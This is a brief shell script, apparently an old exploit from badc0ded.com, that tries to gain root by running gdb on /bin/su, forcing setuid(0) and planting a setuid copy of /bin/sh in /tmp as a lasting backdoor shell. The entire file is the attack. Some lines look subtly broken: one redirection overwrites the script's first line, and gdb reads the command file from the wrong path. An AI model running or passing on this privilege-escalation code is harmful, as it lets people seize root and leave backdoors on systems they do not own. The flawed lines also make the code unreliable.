#!/bin/sh

#include <std_shouts.h>
#include <std_disclaimer.h>
#http://www.badc0ded.com 

echo "#!/bin/sh" > /tmp/runme
echo cp /bin/sh /tmp/sh > /tmp/runme
echo chmod 4755 /tmp/sh >> /tmp/runme
chmod 755 /tmp/runme
echo r root -c /tmp/runme > /tmp/badc0ded
echo break *main+44 >> /tmp/badc0ded
echo c >> /tmp/badc0ded
echo "call setuid(0)" >> /tmp/badc0ded
echo c >> /tmp/badc0ded
gdb /bin/su  < badc0ded > /dev/null
echo "www.badc0ded.com"
sleep 1
rm /tmp/runme /tmp/badc0ded
/tmp/sh


